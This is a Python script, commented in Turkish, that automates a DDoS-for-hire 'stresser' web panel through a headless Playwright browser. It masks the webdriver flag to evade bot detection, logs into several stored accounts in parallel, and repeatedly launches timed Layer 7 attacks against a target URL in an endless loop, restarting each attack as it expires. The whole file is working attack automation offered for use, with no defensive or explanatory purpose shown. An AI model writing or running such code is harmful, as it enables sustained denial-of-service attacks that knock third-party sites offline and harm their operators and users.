import threading
import time
import os
import sys
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout

ACCOUNTS_FILE = "accounts.txt"
MAX_CONCURRENT = 2  # Aynı anda en fazla 2 hesap çalışsın

def load_accounts():
    accounts = []
    if not os.path.exists(ACCOUNTS_FILE):
        print(f"❌ {ACCOUNTS_FILE} bulunamadı! Örnek hesap ile devam ediliyor.")
        return [{"id": "1", "user": "dummy", "pass": "dummy", "url": "https://example.com", "method": "browser-free"}]

    with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
        for idx, line in enumerate(f, 1):
            line = line.strip()
            if not line:
                continue
            parts = line.split(":", 2)
            if len(parts) < 3:
                print(f"⚠️ Geçersiz satır: {line}")
                continue
            user, pwd, rest = parts[0], parts[1], parts[2]
            if ":" in rest:
                url, method = rest.rsplit(":", 1)
            else:
                url = rest
                method = "browser-free"
            accounts.append({
                "id": str(idx),
                "user": user,
                "pass": pwd,
                "url": url,
                "method": method
            })
    return accounts

def attack_worker(account):
    username = account["user"]
    password = account["pass"]
    target_url = account["url"]
    method = account["method"]
    profile_dir = os.path.join(os.getcwd(), f"browser_profiles/profile_{username}")
    os.makedirs(profile_dir, exist_ok=True)

    print(f"[{username}] 🚀 Başlatılıyor | Hedef: {target_url} | Method: {method}")
    consecutive_errors = 0

    while True:
        try:
            with sync_playwright() as p:
                context = p.chromium.launch_persistent_context(
                    user_data_dir=profile_dir,
                    headless=True,
                    viewport={"width": 1280, "height": 720},
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
                    slow_mo=100  # Her işlemi 100ms geciktir (bot koruması)
                )
                page = context.new_page()
                page.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                """)

                print(f"[{username}] 🔐 Giriş yapılıyor...")
                try:
                    # Login sayfasına git (sadece DOM yüklensin yeter)
                    page.goto("https://l7srv.cc/login", timeout=120000, wait_until="domcontentloaded")
                    page.wait_for_load_state("domcontentloaded", timeout=60000)
                    time.sleep(2)

                    # Formu doldur
                    page.fill("#username", username)
                    page.fill("#password", password)

                    # Buton aktif olana kadar bekle (en fazla 30 sn)
                    page.wait_for_selector("#loginNextBtn:not([disabled])", timeout=30000)
                    page.click("#loginNextBtn")

                    # Dashboard'a yönlenene kadar bekle (timeout 60 sn)
                    page.wait_for_url(lambda url: "/dash" in url, timeout=60000)
                    print(f"[{username}] ✅ Giriş başarılı.")
                    consecutive_errors = 0
                except Exception as login_err:
                    print(f"[{username}] ❌ Giriş hatası: {login_err}")
                    context.close()
                    consecutive_errors += 1
                    wait_time = 30 if consecutive_errors < 3 else 120
                    print(f"[{username}] ⏳ {wait_time} saniye bekleniyor...")
                    time.sleep(wait_time)
                    continue

                # Stress sayfası
                print(f"[{username}] 📡 Stress sayfası...")
                try:
                    page.goto("https://l7srv.cc/dash/stress", timeout=120000, wait_until="domcontentloaded")
                    page.wait_for_load_state("domcontentloaded", timeout=60000)
                    time.sleep(3)
                    page.locator("#layer_7").wait_for(state="visible", timeout=15000)
                    page.locator("#layer_7").click()
                    consecutive_errors = 0
                except Exception as stress_err:
                    print(f"[{username}] ❌ Stress hatası: {stress_err}")
                    context.close()
                    consecutive_errors += 1
                    time.sleep(30 if consecutive_errors < 3 else 120)
                    continue

                # Ana saldırı döngüsü
                while True:
                    try:
                        page.fill("#l7host", target_url, timeout=15000)
                        page.select_option("#l7method", value=method, timeout=10000)
                        time_value = 120 if method == "browser-free" else 200
                        page.fill("#l7time", str(time_value), timeout=10000)
                        page.click("#l7btn", timeout=10000)
                        print(f"[{username}] 🔥 Saldırı başladı | {time_value} sn")
                        consecutive_errors = 0

                        while True:
                            no_attacks = page.locator(".dataTables_empty:has-text('No running attacks')")
                            if no_attacks.count() > 0 and no_attacks.is_visible():
                                print(f"[{username}] ⏰ Saldırı bitti.")
                                break
                            expire_cell = page.locator("#attacks-table tbody tr td:nth-child(4) span").first
                            if expire_cell.count() > 0:
                                expire_text = expire_cell.text_content().strip()
                                if expire_text in ["00:00:00", "0"] or expire_text.lower() == "expired":
                                    print(f"[{username}] ⏰ Süre doldu.")
                                    break
                            time.sleep(2)

                        # Sayfayı yenile ve devam et
                        page.reload()
                        page.wait_for_load_state("domcontentloaded", timeout=30000)
                        time.sleep(2)
                        page.locator("#layer_7").click()
                        time.sleep(1)

                    except Exception as inner_err:
                        print(f"[{username}] ⚠️ Adım hatası: {inner_err}")
                        consecutive_errors += 1
                        try:
                            page.reload()
                            time.sleep(5)
                        except:
                            pass
                        continue

        except Exception as outer_err:
            print(f"[{username}] 💥 Kritik hata: {outer_err}")
            consecutive_errors += 1
            time.sleep(30)

if __name__ == "__main__":
    print("🚀 Başlatılıyor...")
    accounts = load_accounts()
    print(f"✅ {len(accounts)} hesap yüklendi.")

    # Thread havuzu (en fazla MAX_CONCURRENT aktif)
    semaphore = threading.Semaphore(MAX_CONCURRENT)
    def worker_wrapper(acc):
        with semaphore:
            attack_worker(acc)

    threads = []
    for acc in accounts:
        t = threading.Thread(target=worker_wrapper, args=(acc,), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(2)  # Tarayıcılar arası çakışmayı azalt

    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("🛑 Kapatılıyor.")
        sys.exit(0)
